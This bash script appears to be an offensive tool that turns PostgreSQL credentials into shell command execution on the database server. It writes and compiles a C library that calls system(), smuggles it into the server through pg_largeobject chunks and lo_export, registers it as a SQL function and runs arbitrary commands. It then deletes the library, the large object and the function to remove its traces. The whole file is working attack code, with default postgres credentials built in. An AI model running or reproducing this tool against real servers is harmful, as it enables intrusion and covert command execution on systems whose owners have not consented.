#! /usr/bin/env bash

function printHelp {
    usage="./pg_exec.sh [options]\n
    Execute a shell commands on a server using PostgreSQL access\n
    Options:\n
        \t--help\t\t\tShow this help text and exit\n
        \t-U, --user\t\tThe username to authenticate to the PostgreSQL server with\n
        \t-P, --password\t\tThe password to authenticate to the PostgreSQl server with\n
        \t-L, --library\t\tA library to upload to the server instead of the default\n
        \t-S, --splitdir\t\tThe temporary directory to store the split parts of the library in\n
        \t-h, --host\t\tThe host running the PostgreSQL service\n
        \t-p, --port\t\tThe port that the PostgreSQL service is running on\n
        \t-c, --command\t\tThe command to execute on the server\n
        \t-e, --export\t\tThe path to save the library to on the server\n
        \t-s, --source\t\tThe source file to compile the library from\n
        \t-f, --function\t\tThe name of the function to be called in the library\n
        \t-b, --blocksize\t\tThe value of LOBLKSIZE. Default 2048
        "
    echo -e $usage
}

function executeCommand {
    PGPASSWORD=$PASSWORD psql -U $USER -h $HOST -p $PORT -t -c "SELECT sys('$*')"
}

# Parse arguments
USER="postgres"
PASSWORD="postgres"
LIBRARY="pg_exec.so"
SPLIT_DIR=".pg_split/"
HOST="localhost"
PORT=5432
COMMAND="sleep 10"
EXPORT_PATH="/tmp/pg_exec.so"
LIB_SOURCE="pg_exec.c"
FUNCTION="pg_exec"
BLOCK_SIZE=2048

while [[ $# -gt 0 ]]; do
    key="$1"
    case $key in
        -U|--user)
            USER="$2"
            shift
            ;;
    	-P|--password)
    	    PASSWORD="$2"
    	    shift
    	    ;;
        -L|--library)
            LIBRARY="$2"
            shift
            ;;
        -S|--splitdir)
            SPLIT_DIR="$2"
            shift
            ;;
    	-h|--host)
            if [ -z $2 ]; then
                printHelp
                exit 0
            else
                HOST="$2"
            fi
    	    shift
    	    ;;
    	-p|--port)
    	    PORT="$2"
    	    shift
    	    ;;
    	-c|--command)
    	    COMMAND="$2"
    	    shift
    	    ;;
        -b|--blocksize)
            BLOCK_SIZE=$2
            shift
            ;;
    	-e|--export)
    	   EXPORT_PATH="$2"
    	   shift
    	   ;;
        -s|--source)
           LIB_SOURCE="$2"
           shift
           ;;
        -f|--function)
           FUNCTION="$2"
           shift
           ;;
        --help)
            printHelp
            exit 0
            ;;
        *)
            printHelp
            exit 0
            ;;
    esac
    shift
done

# If the library doesn't exist create it, and if the source doesn't exist, create it
if [ -f $LIBRARY ]; then
    echo "Using existing library $LIBRARY"
else
    if [ ! -f $LIB_SOURCE ]; then
        echo ' 
                #include <string.h>
                #include "postgres.h"
                #include "fmgr.h"

                #ifdef PG_MODULE_MAGIC
                PG_MODULE_MAGIC;
                #endif

                PG_FUNCTION_INFO_V1(pg_exec);
                Datum pg_exec(PG_FUNCTION_ARGS) {
                    char* command = PG_GETARG_CSTRING(0);
                    PG_RETURN_INT32(system(command));
                }
        ' > $LIB_SOURCE
    fi
    echo "Compiling library from source file $LIB_SOURCE..."
    gcc -I$(pg_config --includedir-server) -shared -fPIC -o $LIBRARY $LIB_SOURCE
fi

# Split the file into exactly 2048 byte chunks so that it can be stored
mkdir -p $SPLIT_DIR
split -b $BLOCK_SIZE $LIBRARY $SPLIT_DIR

# Get the id
LOID=$(PGPASSWORD=$PASSWORD psql -U $USER -h $HOST -p $PORT -t -c 'SELECT lo_creat(-1);' | tr -d '[:space:]') 
if ! [[ $LOID =~ ^[0-9]+$ ]]; then
    echo "Got invalid loid: '$LOID'"
    echo -n $LOID | hexdump
    exit 1
fi

# Construct the query
QUERY="DELETE FROM pg_largeobject WHERE loid=$LOID;"
QUERY="$QUERY\nINSERT INTO pg_largeobject (loid, pageno, data) values "
i=0
for f in $(ls $SPLIT_DIR | sort); do
	QUERY="$QUERY ($LOID, $i, decode('$(base64 -w 0 $SPLIT_DIR$f)', 'base64')),"
	i=$((i+1))
done

# Replace the final , with a ;
QUERY="${QUERY%,};"

# Add the export and create function to the query
QUERY="$QUERY\nSELECT lo_export($LOID, '$EXPORT_PATH');"
QUERY="$QUERY\nCREATE FUNCTION sys(cstring) RETURNS int as '$EXPORT_PATH', '$FUNCTION' LANGUAGE 'c' STRICT;"

PGPASSWORD=$PASSWORD psql -U $USER -h $HOST -p $PORT -t -c "$(echo -e $QUERY)"

echo "Executing $COMMAND..."
executeCommand $COMMAND

# Clean up
executeCommand "rm $EXPORT_PATH"
PGPASSWORD=$PASSWORD psql -U $USER -h $HOST -p $PORT -t -c "DELETE FROM pg_largeobject WHERE loid=$LOID; DROP FUNCTION sys(cstring);"
rm -rf $SPLIT_DIR
